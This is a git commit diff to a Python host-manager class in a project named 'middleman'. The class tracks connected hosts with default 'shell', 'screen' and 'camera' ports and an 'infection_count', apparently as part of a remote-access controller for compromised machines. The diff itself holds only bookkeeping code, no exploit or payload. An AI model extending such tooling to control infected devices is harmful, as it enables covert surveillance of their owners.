f1c97cc84b919726cb305d2a9bd7c35559e8e341
Nguyễn Hoàng Tuấn Anh <86050574+Peaniz@users.noreply.github.com>
2024-12-28 22:25:18 +0700

    Add files via upload

--- middleman/ui/utils/host_manager.py
+++ middleman/ui/utils/host_manager.py
@@ -1,5 +1,6 @@
 import json
 import os
+from datetime import datetime
 
 class HostManager:
     def __init__(self, filename="connected_hosts.json"):
@@ -12,22 +13,54 @@ class HostManager:
                 with open(self.filename, 'r') as f:
                     return json.load(f)
             except:
-                return []
-        return []
+                return {}
+        return {}
 
-    def add_host(self, ip):
-        if ip not in self.hosts:
-            self.hosts.append(ip)
+    def add_host(self, ip, ports=None):
+        """Add or update a host with additional information"""
+        if ports is None:
+            ports = {
+                'shell': 5000,
+                'screen': 5001,
+                'camera': 5002
+            }
+
+        self.hosts[ip] = {
+            'ip': ip,
+            'ports': ports,
+            'first_seen': self.hosts.get(ip, {}).get('first_seen', datetime.now().isoformat()),
+            'last_seen': datetime.now().isoformat(),
+            'status': 'Reachable',
+            'infection_count': self.hosts.get(ip, {}).get('infection_count', 0) + 1
+        }
+        self.save_hosts()
+
+    def update_host_status(self, ip, status):
+        """Update host status and last seen time"""
+        if ip in self.hosts:
+            self.hosts[ip]['status'] = status
+            self.hosts[ip]['last_seen'] = datetime.now().isoformat()
             self.save_hosts()
 
     def remove_host(self, ip):
+        """Remove a host from tracking"""
         if ip in self.hosts:
-            self.hosts.remove(ip)
+            del self.hosts[ip]
             self.save_hosts()
 
     def get_hosts(self):
-        return self.hosts
+        """Get list of all host IPs"""
+        return list(self.hosts.keys())
+
+    def get_host_info(self, ip):
+        """Get detailed information about a specific host"""
+        return self.hosts.get(ip, None)
+
+    def get_active_hosts(self):
+        """Get list of currently active hosts"""
+        return [ip for ip, info in self.hosts.items() if info['status'] == 'Reachable']
 
     def save_hosts(self):
+        """Save hosts data to file"""
         with open(self.filename, 'w') as f:
-            json.dump(self.hosts, f) 
+            json.dump(self.hosts, f, indent=4) 
